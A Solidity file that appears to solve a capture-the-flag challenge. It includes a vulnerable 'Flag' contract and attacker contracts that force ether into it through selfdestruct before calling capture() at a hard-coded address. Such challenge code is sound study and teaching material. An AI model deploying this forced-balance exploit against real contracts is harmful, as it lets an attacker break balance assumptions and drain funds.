pragma solidity 0.5.3;

//The contract that's gonna be pwnd:
contract Flag {
    mapping (address => bool) public captured;

    event LogSneakedUpOn(address indexed who, uint howMuch);
    event LogCaptured(address indexed who, bytes32 braggingRights);

    constructor() public {
    }

    function sneakUpOn() public payable {
        emit LogSneakedUpOn(msg.sender, msg.value);
        msg.sender.transfer(msg.value);
    }

    function capture(bytes32 braggingRights) public {
        require(address(this).balance > 0);
        captured[msg.sender] = true;
        emit LogCaptured(msg.sender, braggingRights);
        msg.sender.transfer(address(this).balance);
    }
}

//The ~ irresistible ~ money bag:
//I'll call this "TAMPPER" (The Amazing Moneybag Pwnage PattERn)
//Thanks, Xavier Leprêtre, for making me see this elegant solution
contract MoneyBag {
    constructor(address payable targetAddress) public payable {
        selfdestruct(targetAddress);
    }
}

//The PWNer:
//*remember to send 1 wei when deploying
contract Pwner {
    address payable public constant victimsAddress = 0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5;
    Flag public victim;
    
    constructor() public payable {
        (new MoneyBag).value(msg.value)(victimsAddress);
        victim = Flag(victimsAddress);
        victim.capture("AYBABTU");
    }
}
